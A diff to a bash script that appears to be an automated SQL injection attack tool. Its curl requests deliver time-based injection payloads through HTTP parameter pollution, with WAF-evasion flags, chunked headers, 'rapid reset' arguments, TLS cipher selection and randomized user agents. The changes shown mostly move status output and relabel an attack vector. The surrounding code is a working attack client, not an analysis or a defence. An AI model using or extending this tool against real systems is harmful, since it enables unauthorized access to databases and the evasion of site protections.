@@ -212,9 +212,9 @@ else
   esac
   output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
 fi
-
-          if [ "$REQ_METHOD" = "POST" ]; then
 echo -e "$output_text"
+          if [ "$REQ_METHOD" = "POST" ]; then
+
           curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
             curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
@@ -222,7 +222,6 @@ echo -e "$output_text"
             -w "%{time_total}|%{http_code}" \
             "${target_url}${default_path}")
         else
-echo -e "$output_text"
           curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null \
@@ -318,7 +317,8 @@ local current_time=$(date +%H:%M:%S)
 local current_method="${REQ_METHOD:-POST}"
 
 if [[ "$payloadsi" = "true" ]]; then
-  output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
+  output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 2 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
+echo -e "$output_text"
 else 
   local technique_name="Generic Time-Based"
   case "${active_payload}" in
@@ -338,9 +338,8 @@ else
       technique_name="Time-Based (Sub-Query Sleep)"
       ;;
   esac
-fi
-
 echo -e "$output_text"
+fi
 
           if [ "$REQ_METHOD" = "POST" ]; then        
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
